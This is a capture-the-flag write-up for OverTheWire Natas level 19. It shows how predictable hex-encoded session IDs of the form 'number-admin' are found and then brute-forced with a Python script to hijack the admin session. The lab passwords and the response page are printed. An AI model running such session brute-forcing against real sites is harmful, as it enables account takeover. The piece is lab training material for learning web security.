# Natas Level 19
```bash
Username: natas19
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
URL:      http://natas19.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas19.png" />
    <div align="center">Natas 19</div>
</figure>

```html
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
```

Lets try to find a pattern in the session IDs:

| Username | Password         | PHPSESSID      | hex-to-ASCII |
| -------- | ---------------- | -------------- | ------------ |
| a        | *empty password* | 36312d61       | 61-a         |
| a        | a                | 3536362d61     | 566-a        |
| a        | a                | 3135332d61     | 153-a        |
| b        | *empty password* | 36313430342d62 | 404-b        |

Its seems like the password is being ignored, a random session ID is being generated and the PHPSESSID is "rand-&lt;username&gt;".

We want the session of "admin", so lets again brute force with this pattern.

Using similar python code:
```python
import requests
import string
import binascii

URL = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

phpsessid = 0

while True:
    cookie = {'PHPSESSID': binascii.hexlify(str(phpsessid) + '-admin')}

    r = requests.get(URL, auth=auth, cookies=cookie)

    if 'retrieve credentials' in r.text:
        phpsessid += 1
    else:
        break

print r.text
```

We get:
```bash
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-wp-preserve="%3Cscript%20src%3D%22http%3A%2F%2Fnatas.labs.overthewire.org%2Fjs%2Fjquery-1.9.1.js%22%3E%3C%2Fscript%3E" data-mce-resize="false" data-mce-placeholder="1" class="mce-object" width="20" height="20" alt="&lt;script&gt;" title="&lt;script&gt;" />
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-wp-preserve="%3Cscript%20src%3D%22http%3A%2F%2Fnatas.labs.overthewire.org%2Fjs%2Fjquery-ui.js%22%3E%3C%2Fscript%3E" data-mce-resize="false" data-mce-placeholder="1" class="mce-object" width="20" height="20" alt="&lt;script&gt;" title="&lt;script&gt;" />
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-wp-preserve="%3Cscript%20src%3Dhttp%3A%2F%2Fnatas.labs.overthewire.org%2Fjs%2Fwechall-data.js%3E%3C%2Fscript%3E" data-mce-resize="false" data-mce-placeholder="1" class="mce-object" width="20" height="20" alt="&lt;script&gt;" title="&lt;script&gt;" /><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-wp-preserve="%3Cscript%20src%3D%22http%3A%2F%2Fnatas.labs.overthewire.org%2Fjs%2Fwechall.js%22%3E%3C%2Fscript%3E" data-mce-resize="false" data-mce-placeholder="1" class="mce-object" width="20" height="20" alt="&lt;script&gt;" title="&lt;script&gt;" />
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-wp-preserve="%3Cscript%3Evar%20wechallinfo%20%3D%20%7B%20%22level%22%3A%20%22natas19%22%2C%20%22pass%22%3A%20%224IwIrekcuZlA9OsjOkoUtwU6lhokCPYs%22%20%7D%3B%3C%2Fscript%3E" data-mce-resize="false" data-mce-placeholder="1" class="mce-object" width="20" height="20" alt="&lt;script&gt;" title="&lt;script&gt;" /></head>
<body>

<h1>natas19</h1>


<div id="content">


<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>


You are an admin. The credentials for the next level are:

<pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre>
</div>

</body>
</html>
```

We got the password for the next level: **eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF**